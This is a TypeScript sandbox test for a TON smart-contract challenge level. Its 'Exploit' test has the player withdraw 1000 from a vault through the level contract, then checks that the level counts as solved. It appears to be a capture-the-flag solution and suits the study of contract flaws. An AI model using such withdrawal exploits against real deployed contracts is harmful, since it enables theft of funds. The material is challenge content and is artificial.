import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { PartialLevel } from '../wrappers/wrappers/PartialLevel';
import { Vault } from '../wrappers/wrappers/Vault';
import '@ton/test-utils';

describe('PartialLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<PartialLevel>;
    let vault: SandboxContract<Vault>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await PartialLevel.fromInit(player.address, 0n));
        vault = blockchain.openContract(await Vault.fromInit(level.address, 0n));

        const deployResult = await level.send(
            owner.getSender(),
            {
                value: toNano('0.1'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: level.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit', async () => {
        // contract.send(player, { value: toNano('0.1') },  { $$type: 'WithdrawFromVault', amount: 1000n })
        level.send(player.getSender(), { value: toNano('0.1') }, { $$type: 'WithdrawFromVault', amount: 1000n });

        await level.send(player.getSender(), { value: toNano('0.1') }, 'check');

        expect(await level.getCompleted()).toEqual(true);
    });
});
